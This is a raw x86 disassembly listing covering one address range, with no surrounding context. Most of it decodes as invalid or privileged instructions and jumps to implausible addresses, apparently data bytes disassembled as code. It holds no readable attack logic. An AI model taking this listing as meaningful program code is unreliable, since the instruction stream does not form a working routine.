  42afd9:	xlat   BYTE PTR ds:[ebx]
  42afda:	aam    0xe3
  42afdc:	(bad)  
  42afdd:	stc    
  42afde:	(bad)  
  42afe0:	add    al,0xef
  42afe2:	shr    esp,0xcf
  42afe5:	jmp    0xf6237fd2
  42afea:	repz mov al,0xf4
  42afed:	call   0xbefc89e1
  42aff2:	(bad)  
  42aff4:	xlat   BYTE PTR ds:[ebx]
  42aff5:	in     al,dx
  42aff6:	cmc    
  42aff7:	rcl    ecx,cl
  42aff9:	mov    edx,0xf003d0e7
  42affe:	out    dx,eax
  42afff:	aad    0xa
  42b001:	add    cl,ah
  42b003:	in     al,0xe8
  42b005:	lods   eax,DWORD PTR ds:[esi]
  42b006:	test   eax,0xc4e0cee0
  42b00b:	mov    al,0xfa
  42b00d:	neg    dh
  42b00f:	in     eax,dx
  42b010:	retf   
  42b011:	xlat   BYTE PTR ds:[ebx]
  42b012:	mov    edi,0xe1dbe2f2
  42b017:	repnz icebp 
  42b019:	rol    edx,cl
  42b01b:	std    
  42b01c:	in     al,0xd9
  42b01e:	rol    ebp,0xdb
  42b021:	(bad)
  42b024:	repz sar BYTE PTR [esi-0x1c190f40],cl
  42b02b:	jmp    0x85ccaa1f
  42b030:	mov    esp,0xe9fffffe
  42b035:	sbb    dh,BYTE PTR [ebp-0x61160001]
  42b03b:	nop
  42b03c:	(bad)  
  42b03d:	(bad)  
  42b03e:	jmp    0x418bbb
  42b043:	mov    eax,DWORD PTR [ebp+0x8]
  42b046:	xor    eax,0x75108b5
  42b04b:	jmp    0x42d3f1
  42b050:	cmp    ebx,edx
  42b052:	inc    ecx
  42b053:	inc    edx
  42b054:	push   ecx
  42b055:	push   eax
  42b056:	cmp    al,dl
  42b058:	xchg   DWORD PTR [eax+0x76],ebx
  42b05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b05c:	mov    dl,0xab
  42b05e:	or     BYTE PTR [edi+0x7b79d181],bh
  42b064:	add    bl,BYTE PTR [eax-0x20198485]
  42b06a:	(bad)  
  42b06c:	mov    ecx,0xf1b6b8df
  42b071:	(bad)  
  42b073:	(bad)  
  42b074:	sar    eax,1
  42b076:	jmp    0x42b082
  42b078:	jmp    0x42b052
  42b07a:	push   cs
  42b07b:	enter  0xcce9,0xaa
  42b07f:	leave  
  42b080:	out    dx,al
  42b081:	test   al,0xc7
  42b083:	aad    0xc6
  42b085:	(bad)  
  42b087:	int3   
  42b088:	in     eax,dx
  42b089:	cmc    
  42b08a:	imul   dl
  42b08c:	int    0xea
  42b08e:	(bad)  
  42b090:	shl    ecx,1
  42b092:	mov    ebx,0xe5d2c6fc
  42b097:	enter  0xc6e4,0xfa
  42b09b:	sti    
  42b09c:	leave  
  42b09d:	in     eax,0xe4
  42b09f:	(bad)  
  42b0a0:	in     eax,dx
  42b0a1:	fadd   st(3),st
  42b0a3:	fcmovnb st,st(7)
  42b0a5:	mov    edx,0xeeeaffb4
  42b0aa:	rcl    dl,cl
  42b0ac:	ret    
  42b0ad:	fst    st(0)
  42b0af:	add    bh,ch
  42b0b1:	xlat   BYTE PTR ds:[ebx]
  42b0b2:	out    0xf5,al
  42b0b4:	hlt    
  42b0b5:	add    ah,dh
  42b0b7:	ret    0xe2d5
  42b0ba:	retf   
  42b0bb:	(bad)  
  42b0bc:	repz out dx,eax
  42b0be:	lods   eax,DWORD PTR ds:[esi]
  42b0bf:	enter  0xbec0,0xd4
  42b0c3:	int3   
  42b0c4:	lods   eax,DWORD PTR ds:[esi]
  42b0c5:	stc    
  42b0c6:	lock stc 
  42b0c8:	(bad)  
  42b0c9:	iret   
  42b0ca:	mov    esi,0xecfacdd4
  42b0cf:	f2xm1  
  42b0d1:	mov    eax,0xcbe005de
  42b0d6:	fcom   st(6)
  42b0d8:	out    dx,al
  42b0d9:	cmc    
  42b0da:	into   
  42b0db:	aam    0x6
  42b0dd:	pop    es
  42b0de:	repz loope 0x42b092
  42b0e1:	(bad)
  42b0e4:	jecxz  0x42b0db
  42b0e6:	loope  0x42b0c7
  42b0e8:	aam    0xe5
  42b0ea:	repnz xlat BYTE PTR ds:[ebx]
  42b0ec:	add    eax,DWORD PTR [ecx]
  42b0ee:	add    edi,esp
  42b0f0:	loope  0x42b0f8
  42b0f2:	add    eax,0xf805e006
  42b0f7:	push   es
  42b0f8:	jmp    0x51076fd
  42b0fd:	shl    dh,cl
  42b0ff:	fadd   st(3),st
  42b101:	out    dx,al
  42b102:	loop   0x42b0ec
  42b104:	into   
  42b105:	mov    ah,0xf4
  42b107:	retf   
  42b108:	cli    
  42b109:	retf   0xcabe
  42b10c:	icebp  
  42b10d:	loop   0x42b0cb
  42b10f:	(bad)  
  42b111:	mov    esi,0xf4ead5fe
  42b116:	rcr    al,0xe9
  42b119:	jmp    0x42b127
  42b11b:	paddd  mm3,mm6
  42b11e:	(bad)  
  42b120:	lds    esi,FWORD PTR [eax-0x1d182c0a]
  42b126:	out    dx,eax
  42b127:	fxch   st(5)
  42b129:	std    
  42b12a:	(bad)  
  42b12b:	fbstp  TBYTE PTR [ecx-0x291e0f08]
  42b131:	int    0xf0
  42b133:	fadd   st,st(3)
  42b135:	in     al,0xf1
  42b137:	sti    
  42b138:	rcr    edi,0xb
  42b13b:	aam    0xf
  42b13d:	leave  
  42b13e:	shr    DWORD PTR [esi+ebp*8-0x523b3819],1
  42b145:	in     al,0xd3
  42b147:	sti    
  42b148:	in     eax,dx
  42b149:	mov    bh,0xdc
  42b14b:	aam    0xef
  42b14d:	add    edi,DWORD PTR [edx-0x53223]
  42b153:	fnstcw WORD PTR [ebp-0x3e2414fe]
  42b159:	aam    0xcb
  42b15b:	loopne 0x42b138
  42b15d:	or     BYTE PTR [ebp-0xb151133],bh
  42b163:	into   
  42b164:	loope  0x42b132
  42b166:	rcl    ebp,0xb6
  42b169:	retf   0xfccc
  42b16c:	call   0xef408d30
  42b171:	aad    0xf4
  42b173:	in     eax,0xa
  42b175:	sti    
  42b176:	jmp    0x42b170
  42b178:	or     bh,ch
  42b17a:	iret   
  42b17b:	loopne 0x42b187
  42b17d:	(bad)
  42b181:	cmc    
  42b182:	iret   
  42b183:	jmp    0xe7138478
  42b188:	shl    BYTE PTR [edi-0x346042e],cl
  42b18e:	shr    dh,cl
  42b190:	fidiv  DWORD PTR [ebp+eiz*8-0x13c2b2a]
  42b197:	loope  0x42b159
  42b199:	inc    DWORD PTR [ebx]
  42b19b:	clc    
  42b19c:	int    0x1
  42b19e:	mov    eax,0xcde6f0bc
  42b1a3:	shl    BYTE PTR [esi-0x4274c31],1
  42b1a9:	into   
  42b1aa:	cld    
  42b1ab:	mov    ah,0x3
  42b1ad:	mov    eax,0xdcd307f5
  42b1b2:	out    0xc7,al
  42b1b4:	aad    0xc6
  42b1b6:	or     esp,esi
  42b1b8:	fscale 
  42b1ba:	leave  
  42b1bb:	iret   
  42b1bc:	cld    
  42b1bd:	fcmovb st,st(4)
  42b1bf:	call   0xcd118072
  42b1c4:	rcl    dh,cl
  42b1c6:	mov    bl,0xcd
  42b1c8:	mov    al,0xd5
  42b1ca:	(bad)  
  42b1cb:	mov    edx,0xdadaccd0
  42b1d0:	pop    es
  42b1d1:	mov    esp,0x5dcfbdd
  42b1d6:	pop    es
  42b1d7:	aad    0xc6
  42b1d9:	(bad)  
  42b1da:	stc    
  42b1db:	sti    
  42b1dc:	rcl    DWORD PTR [ebx],0xb2
  42b1df:	into   
  42b1e0:	fadd   st(3),st
  42b1e2:	(bad)  
  42b1e3:	xlat   BYTE PTR ds:[ebx]
  42b1e4:	mov    dl,0xb1
  42b1e6:	stc    
  42b1e7:	in     eax,0xc7
  42b1e9:	lods   al,BYTE PTR ds:[esi]
  42b1ea:	mov    ebp,0xdd02feef
  42b1ef:	sti    
  42b1f0:	add    bl,bh
  42b1f2:	mov    esi,0xe2c5f2d6
  42b1f7:	add    eax,DWORD PTR [edi]
  42b1f9:	jecxz  0x42b1c9
  42b1fb:	in     eax,dx
  42b1fc:	rcr    ecx,0xa9
  42b1ff:	fsubr  QWORD PTR [esp+ebp*4-0x2e144f33]
  42b206:	aad    0xb5
  42b208:	call   0xb210a400
  42b20d:	sar    DWORD PTR [ebx+0x4f7bcf3],1
  42b213:	rol    DWORD PTR [esi],1
  42b215:	mov    eax,0xe40bcac2
  42b21a:	or     ch,ch
  42b21c:	add    esi,ecx
  42b21e:	shr    BYTE PTR [eax+esi*4-0x4f2a2322],cl
  42b225:	(bad)  
  42b226:	into   
  42b227:	int    0xee
  42b229:	in     eax,0xf3
  42b22b:	jecxz  0x42b1de
  42b22d:	(bad)  
  42b22e:	loope  0x42b22c
  42b230:	fsubrp st(6),st
  42b232:	aam    0xdd
  42b234:	mov    esp,0xebf4defd
  42b239:	pop    es
  42b23a:	(bad)  
  42b23b:	jmp    0xec079a41
  42b240:	jmp    0xefcd:0xf1e8c0b1
  42b247:	sti    
  42b248:	mov    al,0xdd
  42b24a:	repz mov dh,0xda
  42b24d:	shl    ah,cl
  42b24f:	cld    
  42b250:	fldln2 
  42b252:	icebp  
  42b253:	mov    ah,0xf8
  42b256:	retf   
  42b257:	clc    
  42b258:	sti    
  42b259:	fiadd  DWORD PTR [eax]
  42b25b:	int3   
  42b25c:	stc    
  42b25d:	loop   0x42b21f
  42b25f:	repnz jecxz 0x42b24f
  42b262:	int3   
  42b263:	(bad)  
  42b264:	in     al,0xc0
  42b266:	repnz sti 
  42b268:	lods   eax,DWORD PTR ds:[esi]
  42b269:	idiv   BYTE PTR [ebp-0x1d36222a]
  42b26f:	pop    es
  42b270:	add    bh,BYTE PTR [eax-0x60707fc]
  42b276:	retf   
  42b277:	add    cl,bl
  42b279:	cld    
  42b27a:	jmp    0xf31ac181
  42b27f:	shl    ebx,cl
  42b281:	out    dx,al
  42b282:	ret    0xb5fb
  42b285:	(bad)  
  42b286:	out    0xc6,al
  42b288:	sar    DWORD PTR [ebx-0x92a3046],cl
  42b28e:	imul   dh
  42b290:	icebp  
  42b291:	jmp    eax
  42b293:	push   es
  42b294:	fadd   QWORD PTR [ecx]
  42b296:	aam    0xc7
  42b298:	out    dx,eax
  42b299:	out    dx,eax
  42b29a:	(bad)  
  42b29b:	aam    0xea
  42b29d:	repz shl al,0xc0
  42b2a1:	lods   al,BYTE PTR ds:[esi]
  42b2a2:	(bad)  
  42b2a3:	icebp  
  42b2a4:	test   eax,0xd4ebedc0
  42b2a9:	lock stc 
  42b2ab:	cli    
  42b2ac:	add    dl,ch
  42b2ae:	mov    ebp,0x306d1e0
  42b2b3:	int3   
  42b2b4:	or     dh,al
  42b2b6:	hlt    
  42b2b7:	aad    0xa
  42b2b9:	out    0xcd,al
  42b2bb:	push   cs
  42b2bc:	lds    eax,FWORD PTR [edi]
  42b2be:	leave  
  42b2bf:	(bad)  
  42b2c0:	fidiv  WORD PTR [eax-0x8105352]
  42b2c6:	(bad)  
  42b2c7:	int3   
  42b2c8:	(bad)  
  42b2cb:	(bad)  
  42b2cc:	jmp    0xf926aaa1
  42b2d1:	repnz repz jecxz 0x42b2aa
  42b2d5:	rol    dl,1
  42b2d7:	out    0xb,eax
  42b2d9:	add    eax,0xfd8e6da
  42b2de:	int    0xc4
  42b2e0:	into   
  42b2e1:	jmp    0xc60b7dc3
  42b2e6:	jmp    0x42b2ae
  42b2e8:	clc    
  42b2e9:	hlt    
  42b2ea:	fdivr  DWORD PTR [ebx-0x42fc404b]
  42b2f0:	cld    
  42b2f1:	sar    edi,cl
  42b2f3:	out    0xc3,al
  42b2f5:	(bad)  
  42b2f6:	jmp    0x42b2f4
  42b2f8:	fnstcw WORD PTR [ebp+esi*8-0x26f00728]
  42b2ff:	mov    dl,0xa5
  42b301:	jmp    0xd82e8ebd
  42b306:	(bad)  
  42b307:	in     al,dx
  42b308:	mov    ebx,0xe9babac8
  42b30d:	(bad)  
  42b30f:	(bad)  
  42b310:	loop   0x42b2f9
  42b312:	(bad)  
  42b314:	(bad)  
  42b315:	fdivrp st(1),st
  42b317:	mul    esi
  42b319:	cmc    
  42b31a:	(bad)  
  42b31c:	call   0xa9126000
  42b321:	in     eax,dx
  42b322:	(bad)
  42b325:	fcmovne st,st(5)
  42b327:	mov    edx,0xf9fccdf3
  42b32c:	fcmovnu st,st(6)
  42b32e:	aam    0xbd
  42b330:	push   es
  42b331:	out    0xec,eax
  42b333:	mov    edx,0xe0cbfe07
  42b338:	(bad)  
  42b339:	fsub   st,st(7)
  42b33b:	out    0xf9,al
  42b33d:	int3   
  42b33e:	ret    
  42b33f:	jecxz  0x42b2ed
  42b341:	xlat   BYTE PTR ds:[ebx]
  42b342:	int3   
  42b343:	jmp    0x42b340
  42b345:	rcl    ch,0xd4
  42b348:	leave  
  42b349:	lods   al,BYTE PTR ds:[esi]
  42b34a:	mov    bl,0xde
  42b34c:	neg    eax
  42b34e:	int3   
  42b34f:	(bad)  
  42b351:	repz cmc 
  42b353:	shl    bh,0xcb
  42b356:	jmp    0x42b33f
  42b358:	sar    ah,0x1
  42b35b:	clc    
  42b35c:	lds    eax,FWORD PTR [eax]
  42b35e:	out    0xce,eax
  42b360:	mov    edi,0xe2e1bcae
  42b365:	jmp    0x42b32e
  42b367:	(bad)  
  42b368:	sti    
  42b369:	mov    bh,0xed
  42b36b:	retf   
  42b36c:	std    
  42b36d:	mov    eax,0xbdbcb6cc
  42b372:	rcr    eax,0xf3
  42b375:	clc    
  42b376:	in     al,0xff
  42b378:	enter  0x608,0xe4
  42b37c:	fsubr  st(6),st
  42b37e:	mov    esp,0xc7beeae5
  42b383:	jecxz  0x42b345
  42b385:	mov    edx,0xd5adc0e7
  42b38a:	(bad)  
  42b38b:	rcr    esp,1
  42b38d:	ret    
  42b38e:	add    edi,edi
  42b390:	mul    dl
  42b392:	out    0xbd,al
  42b394:	pop    es
  42b395:	sar    bh,0x1
  42b398:	cli    
  42b399:	(bad)  
  42b39a:	or     al,0xe0
  42b39c:	or     al,0xe4
  42b39e:	(bad)
  42b3a1:	loope  0x42b398
  42b3a3:	shr    cl,0xda
  42b3a6:	mov    edx,0xb3efe5d2
  42b3ab:	aad    0xd6
  42b3ad:	shr    ebp,cl
  42b3af:	mov    edx,0xc5d6c1f3
  42b3b4:	shl    ch,cl
  42b3b6:	(bad)  
  42b3b7:	xlat   BYTE PTR ds:[ebx]
  42b3b8:	jmp    0x42b384
  42b3ba:	add    DWORD PTR [ebx],edx
  42b3bc:	jmp    0xefa8:0xd3d1c5f3
  42b3c3:	sti    
  42b3c4:	mov    ebx,0xf4c0f4e9
  42b3c9:	lock in al,0xee
  42b3cc:	fdivp  st(2),st
  42b3ce:	leave  
  42b3cf:	sti    
  42b3d0:	add    DWORD PTR [edi],eax
  42b3d2:	fcmovbe st,st(5)
  42b3d4:	or     edi,ebx
  42b3d6:	fisttp WORD PTR [edi]
  42b3d8:	sti    
  42b3d9:	(bad)  
  42b3da:	fmul   st,st(4)
  42b3dc:	loop   0x42b3cb
  42b3de:	test   al,0xf0
  42b3e0:	lock aad 0xd3
  42b3e3:	(bad)  [ecx-0x31083354]
  42b3e9:	mov    ch,0xba
  42b3eb:	jecxz  0x42b3c9
  42b3ed:	add    bl,dh
  42b3ef:	loopne 0x42b3ae
  42b3f1:	cld    
  42b3f2:	repnz xlat BYTE PTR ds:[ebx]
  42b3f4:	(bad)  
  42b3f5:	loopne 0x42b3bd
  42b3f7:	in     al,0xde
  42b3f9:	pand   mm4,mm7
  42b3fc:	(bad)  
  42b3fd:	in     eax,0xc6
  42b3ff:	int3   
  42b400:	ror    esi,1
  42b402:	lods   eax,DWORD PTR ds:[esi]
  42b403:	imul   BYTE PTR [ecx-0x8303605]
  42b409:	fst    st(7)
  42b40b:	repnz into 
  42b40d:	mov    edx,0xda06f5c9
  42b412:	inc    DWORD PTR [esi]
  42b414:	or     al,BYTE PTR [eax]
  42b416:	test   edi,0xde07c4d6
  42b41c:	les    ecx,FWORD PTR [esi+edi*4]
  42b41f:	out    dx,al
  42b420:	lods   al,BYTE PTR ds:[esi]
  42b421:	mov    esp,0xf4d5e2f0
  42b426:	repz cmc 
  42b428:	in     al,dx
  42b429:	ffreep st(5)
  42b42b:	aam    0xbe
  42b42d:	std    
  42b42e:	mov    edi,0x6fab8db
  42b433:	fnstcw WORD PTR [ebp-0x4143b16]
  42b439:	clc    
  42b43a:	retf   0xdde1
  42b43d:	cld    
  42b43e:	mov    ecx,0xeca8dcf3
  42b443:	loopne 0x42b414
  42b445:	(bad)  
  42b446:	out    dx,al
  42b447:	idiv   dh
  42b449:	enter  0xd4d6,0xf1
  42b44d:	add    esi,esi
  42b44f:	hlt    
  42b450:	mov    ch,0x0
  42b452:	out    0xc0,al
  42b454:	shr    cl,1
  42b456:	rol    BYTE PTR [edx],0xd5
  42b459:	fsubr  st(4),st
  42b45b:	out    dx,al
  42b45c:	shl    esp,cl
  42b45e:	shr    al,0xd0
  42b461:	jecxz  0x42b42c
  42b463:	lods   eax,DWORD PTR ds:[esi]
  42b464:	jmp    0xb6306f55
  42b469:	(bad)  
  42b46a:	(bad)  
  42b46b:	mov    esp,0xf8f1b8ff
  42b470:	add    esi,esp
  42b472:	int3   
  42b473:	loopne 0x42b458
  42b475:	mov    eax,0xfe3e0e0
  42b47a:	(bad)  
  42b47b:	loopne 0x42b488
  42b47d:	out    dx,eax
  42b47e:	in     al,dx
  42b47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b480:	ret    
  42b481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b482:	fucomp st(6)
  42b484:	leave  
  42b485:	xlat   BYTE PTR ds:[ebx]
  42b486:	jmp    0x42b44f
  42b488:	(bad)  
  42b489:	int3   
  42b48a:	shl    BYTE PTR [edx-0x3d1e1d13],cl
  42b490:	(bad)  
  42b491:	mov    esp,0xcae1dede
  42b496:	call   0xe932928b
  42b49b:	cli    
  42b49c:	cld    
  42b49d:	in     eax,dx
  42b49e:	mov    ebp,0xf2d0caa8
  42b4a3:	in     eax,dx
  42b4a4:	(bad)  
  42b4a5:	aam    0xe7
  42b4a7:	(bad)
  42b4aa:	push   DWORD PTR [edx-0xa080310]
  42b4b0:	mov    esp,0xc0f6d4bf
  42b4b5:	add    dl,cl
  42b4b7:	fcmovnbe st,st(7)
  42b4b9:	(bad)  
  42b4bb:	in     al,0xd9
  42b4bd:	push   es
  42b4be:	mov    eax,0xc8c0d6ef
  42b4c3:	mov    cl,0xfa
  42b4c5:	mov    bl,0xeb
  42b4c7:	test   esp,0xe3edb4fd
  42b4cd:	mov    esp,0xf8fcb6f1
  42b4d2:	jecxz  0x42b4bf
  42b4d4:	fadd   DWORD PTR [ecx]
  42b4d6:	add    al,0xe1
  42b4d8:	iret   
  42b4d9:	clc    
  42b4da:	cli    
  42b4db:	or     bh,dl
  42b4dd:	or     al,0xe7
  42b4df:	(bad)  
  42b4e0:	xlat   BYTE PTR ds:[ebx]
  42b4e1:	int    0xca
  42b4e3:	int    0xa9
  42b4e5:	loop   0x42b49a
  42b4e7:	ror    ch,0xdb
  42b4ea:	(bad)  
  42b4eb:	jmp    0xd82472db
  42b4f0:	in     eax,dx
  42b4f1:	sti    
  42b4f2:	mov    esi,0x3e4f6f5
  42b4f7:	lock leave 
  42b4f9:	fsubr  st(7),st
  42b4fb:	in     eax,0xe
  42b4fd:	clc    
  42b4fe:	in     al,0xb1
  42b500:	(bad)  
  42b501:	test   al,0xd7
  42b503:	(bad)  
  42b504:	fcmovnbe st,st(6)
  42b506:	enter  0xedb7,0xd3
  42b50a:	jmp    0xf7f4:0xf2d9e2fe
  42b511:	add    edi,DWORD PTR [ebx-0xf211afa]
  42b517:	rcl    bh,0xfd
  42b51a:	iret   
  42b51b:	leave  
  42b51c:	jmp    0xb1d5:0xbcbecedc
  42b523:	lds    esi,FWORD PTR [ebx+esi*8-0x2448131f]
  42b52a:	(bad)  
  42b52c:	mov    cl,0xd9
  42b52e:	ret    0x1f9
  42b531:	out    dx,al
  42b532:	lds    ecx,FWORD PTR [ebx]
  42b534:	ret    0xdee5
  42b537:	add    BYTE PTR [ebp-0x27070a3b],bh
  42b53d:	leave  
  42b53e:	in     al,dx
  42b53f:	retf   
  42b540:	ret    0xb3ee
  42b543:	(bad)
  42b546:	xlat   BYTE PTR ds:[ebx]
  42b547:	(bad)  
  42b549:	in     eax,0xfe
  42b54b:	fild   WORD PTR [ebx]
  42b54d:	aam    0xc8
  42b54f:	loop   0x42b50d
  42b551:	std    
  42b552:	out    0xfc,al
  42b554:	frndint 
  42b556:	xlat   BYTE PTR ds:[ebx]
  42b557:	(bad)  
  42b558:	sti    
  42b559:	add    al,bh
  42b55b:	les    eax,FWORD PTR [ecx+edi*8]
  42b55e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b55f:	mov    bl,0xc7
  42b561:	scas   al,BYTE PTR es:[edi]
  42b562:	mov    esp,0xecf7ede5
  42b567:	in     eax,dx
  42b568:	shl    esp,cl
  42b56a:	shr    bh,1
  42b56c:	(bad)  
  42b56d:	mov    ebx,0xd7ed00e8
  42b572:	rol    BYTE PTR [ecx],0xa
  42b575:	add    al,0xe0
  42b577:	clc    
  42b578:	fcom   st(5)
  42b57a:	out    0xc5,eax
  42b57c:	call   0xf7f4727f
  42b581:	mov    dh,0xca
  42b583:	aad    0xd7
  42b585:	int3   
  42b586:	stc    
  42b587:	clc    
  42b588:	fsubp  st(6),st
  42b58a:	mov    edi,0xe2d0bffc
  42b58f:	in     al,dx
  42b590:	fdecstp 
  42b592:	mov    esp,0x5fcff02
  42b597:	jmp    0x42b563
  42b599:	add    edi,edi
  42b59b:	aam    0x3
  42b59d:	retf   
  42b59e:	(bad)
  42b5a1:	shr    DWORD PTR [edi-0x464f1a1f],1
  42b5a7:	into   
  42b5a8:	out    dx,eax
  42b5a9:	std    
  42b5aa:	shr    eax,1
  42b5ac:	hlt    
  42b5ad:	xlat   BYTE PTR ds:[ebx]
  42b5ae:	fdivrp st(7),st
  42b5b0:	int3   
  42b5b1:	(bad)  
  42b5b2:	rol    DWORD PTR ds:0xe4e0cbcb,1
  42b5b8:	or     edi,edi
  42b5ba:	fadd   st(5),st
  42b5bc:	or     al,0xc8
  42b5be:	in     al,0xe9
  42b5c0:	shl    edx,0xef
  42b5c3:	out    0xc2,al
  42b5c5:	fnstenv [ecx-0x21100425]
  42b5cb:	std    
  42b5cc:	stc    
  42b5cd:	(bad)  
  42b5cf:	mov    dh,0xd9
  42b5d1:	icebp  
  42b5d2:	rcl    ebp,1
  42b5d4:	xlat   BYTE PTR ds:[ebx]
  42b5d5:	std    
  42b5d6:	ret    0xfefa
  42b5d9:	push   es
  42b5da:	in     al,0xfd
  42b5dc:	add    edx,DWORD PTR [ebx]
  42b5de:	fdivr  QWORD PTR [edi-0x4b1e3836]
  42b5e4:	ror    ch,1
  42b5e6:	int3   
  42b5e7:	cli    
  42b5e8:	jmp    0xefc9:0xf5cdbbfb
  42b5ef:	(bad)  
  42b5f0:	stc    
  42b5f1:	imul   ebp
  42b5f3:	loop   0x42b5d7
  42b5f5:	mov    esp,0xcfca0bd7
  42b5fa:	(bad)  
  42b5fb:	in     al,dx
  42b5fc:	fld    DWORD PTR [eax]
  42b5fe:	loop   0x42b5b8
  42b600:	in     eax,dx
  42b601:	leave  
  42b602:	xlat   BYTE PTR ds:[ebx]
  42b603:	loop   0x42b5d6
  42b605:	shl    DWORD PTR [edx-0x1421360f],1
  42b60b:	cli    
  42b60c:	jmp    0x42b5ea
  42b60e:	in     al,dx
  42b60f:	aad    0xc2
  42b611:	clc    
  42b612:	add    bl,ch
  42b614:	std    
  42b615:	(bad)  
  42b616:	std    
  42b617:	inc    DWORD PTR ds:0x6ecded8
  42b61d:	in     al,dx
  42b61e:	mov    bl,0xb1
  42b620:	(bad)  
  42b621:	fsubp  st(1),st
  42b623:	out    0xc5,eax
  42b625:	shl    BYTE PTR [eax-0x300c3738],0xfe
  42b62c:	out    dx,eax
  42b62d:	clc    
  42b62e:	call   0x33f9dfb
  42b633:	cmc    
  42b634:	jmp    0x42b621
  42b636:	cld    
  42b637:	(bad)  
  42b639:	or     ch,dh
  42b63b:	stc    
  42b63c:	pop    es
  42b63d:	rol    dh,cl
  42b63f:	mov    dl,0xe0
  42b641:	test   al,0xf2
  42b643:	jecxz  0x42b638
  42b645:	mov    edx,0xc9f1cee0
  42b64a:	retf   0xeff2
  42b64d:	cld    
  42b64e:	rcl    cl,1
  42b650:	loopne 0x42b649
  42b652:	cmc    
  42b653:	in     al,0x1
  42b655:	frstpm(287 only) 
  42b657:	or     ebx,edx
  42b659:	add    al,0xdd
  42b65b:	in     al,0xf9
  42b65d:	(bad)  
  42b65f:	test   eax,0xdcb0ebce
  42b664:	icebp  
  42b665:	icebp  
  42b666:	cli    
  42b667:	shl    ebp,cl
  42b669:	rcr    ah,1
  42b66b:	(bad)  
  42b66d:	out    dx,eax
  42b66e:	cmc    
  42b66f:	loopne 0x42b643
  42b671:	fst    st(6)
  42b673:	cli    
  42b674:	ret    
  42b675:	lock clc 
  42b677:	add    eax,0xecfb04dd
  42b67c:	add    ah,dh
  42b67e:	stos   BYTE PTR es:[edi],al
  42b67f:	lods   al,BYTE PTR ds:[esi]
  42b680:	(bad)  
  42b681:	loope  0x42b66c
  42b683:	scas   al,BYTE PTR es:[edi]
  42b684:	mul    ebp
  42b686:	(bad)  
  42b687:	clc    
  42b688:	icebp  
  42b689:	cli    
  42b68a:	std    
  42b68b:	mov    edi,0xb9edcfd6
  42b690:	rcr    ah,1
  42b692:	loope  0x42b69f
  42b694:	add    dh,bh
  42b696:	sti    
  42b697:	out    0xf4,eax
  42b699:	fdiv   st(0),st
  42b69b:	jmp    0x42b69d
  42b69d:	in     eax,0xf0
  42b69f:	mov    bl,0xd2
  42b6a1:	mov    bl,0xe8
  42b6a3:	cmc    
  42b6a4:	mov    ch,0xc5
  42b6a6:	clc    
  42b6a7:	(bad)
  42b6aa:	mov    esi,0xe9f8e8d2
  42b6af:	mov    edi,0x2e1bfc0
  42b6b4:	out    0xfd,al
  42b6b6:	aam    0xc1
  42b6b8:	out    0xe4,al
  42b6ba:	(bad)  
  42b6bb:	or     al,0x7
  42b6bd:	out    dx,al
  42b6be:	jmp    0xb7fb:0xd6c1ccb2
  42b6c5:	out    0xd4,eax
  42b6c7:	icebp  
  42b6c8:	xlat   BYTE PTR ds:[ebx]
  42b6c9:	leave  
  42b6ca:	sar    edi,cl
  42b6cc:	out    dx,eax
  42b6cd:	into   
  42b6ce:	icebp  
  42b6cf:	fcmovu st,st(1)
  42b6d1:	add    bl,dl
  42b6d3:	hlt    
  42b6d4:	cmc    
  42b6d5:	jmp    0x42b6cb
  42b6d7:	(bad)
  42b6db:	sti    
  42b6dc:	jmp    0x42b6bf
  42b6de:	out    0xdd,al
  42b6e0:	scas   eax,DWORD PTR es:[edi]
  42b6e1:	mov    esi,0xccc0f5f4
  42b6e6:	mov    ah,0xed
  42b6e8:	out    0xdf,al
  42b6ea:	in     eax,dx
  42b6eb:	mov    dh,0xee
  42b6ed:	fptan  
  42b6ef:	out    0xe6,eax
  42b6f1:	(bad)  
  42b6f3:	int3   
  42b6f4:	loope  0x42b6e1
  42b6f6:	fimul  WORD PTR [edx]
  42b6f8:	loop   0x42b6da
  42b6fa:	(bad)  
  42b6fc:	in     eax,dx
  42b6fd:	adc    ebp,eax
  42b6ff:	mov    esi,0xeac2d3b1
  42b704:	div    DWORD PTR [ebp-0x2d131047]
  42b70a:	fcomip st,st(2)
  42b70c:	cli    
  42b70d:	mov    edx,0xe1fefade
  42b712:	xlat   BYTE PTR ds:[ebx]
  42b713:	fmul   st(3),st
  42b715:	cmc    
  42b716:	hlt    
  42b717:	jecxz  0x42b6df
  42b719:	leave  
  42b71a:	cld    
  42b71b:	les    edx,FWORD PTR [edx]
  42b71d:	iret   
  42b71e:	stos   DWORD PTR es:[edi],eax
  42b71f:	in     al,0xcb
  42b721:	mov    cl,0xf2
  42b723:	icebp  
  42b724:	aam    0xfb
  42b726:	fcmovne st,st(0)
  42b728:	lock aad 0xc8
  42b72b:	div    ch
  42b72d:	repz ret 0xfebe
  42b731:	stc    
  42b732:	fdivrp st(2),st
  42b734:	test   BYTE PTR [ebx],0xe5
  42b737:	paddw  mm1,mm2
  42b73a:	(bad)  
  42b73b:	inc    DWORD PTR [ecx]
  42b73d:	adc    cl,ch
  42b73f:	int    0xc1
  42b741:	loope  0x42b6f1
  42b743:	mov    dh,0xfa
  42b745:	cli    
  42b746:	cmc    
  42b747:	leave  
  42b748:	fcomi  st,st(3)
  42b74a:	mov    bl,0xdc
  42b74c:	mov    ebx,0x3ecd7fd
  42b751:	sar    edx,0xbc
  42b754:	out    0xe7,eax
  42b756:	out    0xbe,eax
  42b758:	std    
  42b759:	push   es
  42b75a:	fadd   DWORD PTR [edi+ecx*8]
  42b75d:	fsubr  DWORD PTR [ecx-0x4c094220]
  42b763:	(bad)  
  42b764:	lock mov al,0xcd
  42b767:	repnz fstp TBYTE PTR [eax-0x2e064911]
  42b76e:	aam    0xf6
  42b770:	rol    dh,cl
  42b772:	pop    es
  42b773:	fdiv   st,st(1)
  42b775:	icebp  
  42b776:	out    0xf8,al
  42b778:	add    cl,BYTE PTR [eax]
  42b77a:	out    0xcc,al
  42b77c:	in     al,0xcf
  42b77e:	ret    
  42b77f:	call   0xeaf1a567
  42b784:	loope  0x42b74a
  42b786:	out    0xe6,al
  42b788:	aad    0xe5
  42b78a:	aad    0xf0
  42b78c:	repz rcl ebp,1
  42b78f:	mov    esp,0xdad6cdd0
  42b794:	jecxz  0x42b76d
  42b796:	std    
  42b797:	xlat   BYTE PTR ds:[ebx]
  42b798:	out    0x3,eax
  42b79a:	or     al,0x7
